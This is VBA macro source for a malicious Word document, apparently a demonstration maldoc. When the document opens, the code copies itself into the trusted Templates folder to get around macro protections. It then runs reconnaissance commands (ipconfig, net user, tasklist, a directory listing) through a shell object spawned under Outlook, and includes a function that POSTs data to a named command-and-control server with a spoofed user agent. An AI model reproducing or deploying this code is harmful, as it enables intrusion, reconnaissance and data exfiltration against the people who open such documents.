'Encoding and decoding of strings into Base64
'Function EncodeBase64(data As String) As String
    'Set Encode = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(input))
    'Return Encode
'End Function

'function for running commands on the victim
Function RunCommand(command As String) As String
    
    'handle errors
    On Error GoTo Error
    
    'create the outlook object
    Set objOL = CreateObject("Outlook.Application")
    
    'create shell object under the outlook object
    Set WshShell = objOL.CreateObject("Wscript.Shell")
    
    'execute the command from the new shell boject
    Set WshShellExec = WshShell.Exec(command)
    
    'read the output of the command
    RunCommand = WshShellExec.StdOut.ReadAll
    
Done:
    Exit Function
    
    'handle errors
Error:
    RunCommand = "Error"

End Function

'function for sending data to the command server
Function SendToServer(data As String)
    'handle errors
    On Error GoTo Error

    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")

    'set the c2 IP and port
    URL = "http://jh-win-svr2.radux.uk:5000"

    'send the data as a POST request
    objHTTP.Open "POST", URL, False

    'set the user agent to a common one
    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)"

    'send the data
    objHTTP.send (data)

Done:
    Exit Function

    'handle errors
Error:
    MsgBox ("Cannot connect to server")

End Function

Function CopyCurrentToTrusted(CurrentFile As String)
    'Copy the current word document to the trusted location (%APPDATA%\Microsoft\Templates)
    Dim FSO As Object
    Set FSO = CreateObject("Scripting.FileSystemObject")
    
    AppdataPath = Environ$("appdata")
    TemplatesPath = AppdataPath & "\Microsoft\Templates"
    Destination = TemplatesPath & "\naughtydoc.docm"
    
    Call FSO.CopyFile(CurrentFile, Destination, True)
    
Done:
    Exit Function
    
Error:
    MsgBox ("There was an error copying the file")
End Function

Function FormDestinationPath() As String
    'Form the destination path for the malicious document
    Dim FSO As Object
    Set FSO = CreateObject("Scripting.FileSystemObject")
    
    AppdataPath = Environ$("appdata")
    FormDestinationPath = AppdataPath & "\Microsoft\Templates\" & ThisDocument.Name & ".docm"
End Function

Function IsDocumentTrusted() As Boolean
    'Gets the path of current file. if it is not inside %APPDATA%\Microsoft\Templates, copies the untrusted doc, opens the copied document, closes the untrusted document.
    Dim CurrentPath As String
    CurrentPath = ThisDocument.Path

    'check if the document is in the trusted location
    If InStr(CurrentPath, "Microsoft\Templates") Then
        IsDocumentTrusted = True
    Else
        IsDocumentTrusted = False
    End If
End Function

'this function is called when the word document is opened
Sub Document_Open()
    'check if the document is in the trusted location
    Dim IsDocumentTrustedBoolean As Boolean
    IsDocumentTrustedBoolean = IsDocumentTrusted()

    If IsDocumentTrustedBoolean = True Or InStr(ThisDocument.Name, "demo") Then
        'Continue execution of normal code.
        Dim strData As String
        Dim strCommand As String

        strOutput = RunCommand("ipconfig")
        DocBox (strOutput)

        'SendToServer(strOutput)

        userList = RunCommand("net user")
        DocBox (userList)

        processList = RunCommand("tasklist")
        DocBox (processList)

        childitems = PS_GetOutput("Get-ChildItem -Path 'C:\'")
        DocBox (childitems)
        
        'tell the user they're pwned
        MsgBox ("You've been pwned. Scroll down...")
    Else
        'copy the untrusted document to the trusted location
        Dim CurrentFile As String
        CurrentFile = ThisDocument.Path & "\" & ThisDocument.Name
        CopyCurrentToTrusted (CurrentFile)

        'prepare to open the copied document
        Set WordOL = CreateObject("Word.Application")

        Dim Destination As String
        Destination = FormDestinationPath

        'open the trusted document
        Set WordDoc = WordOL.Documents.Open(Destination)

        'close the untrusted document
        ThisDocument.Close SaveChanges:=False
    End If
    
End Sub

Function cleanup()
    'handle errors
    On Error GoTo Error

    'cleanup
    Dim FSO As Object
    Set FSO = CreateObject("Scripting.FileSystemObject")
    Destination = FormDestinationPath
    FSO.DeleteFile Destination

    MsgBox ("Cleanup complete")
    
Done:
    Exit Function
Error:
    MsgBox ("There was an error trying to cleanup, please go to '%APPDATA%\Microsoft\Templates' in your file explorer and delete " & ThisDocument.Name & " manually")
End Function

Sub Document_Close()
    'cleanup
    cleanup
End Sub

Function DocBox(strData As String)
    'This function adds text to the TerminalOut ActiveX Text Box as if it were a terminal
    'It provides similar functionality to MsgBox but instead of popups, it adds text to the TerminalOut text box.
    
    ' Temporarily store the data already inside the TerminalOut text box
    Dim strTemp As String
    strTemp = TerminalOut.Text

    ' Add the new data to the end of the old data
    strTemp = strTemp & strData

    ' Set the TerminalOut text box to the new data
    TerminalOut.Text = strTemp
End Function

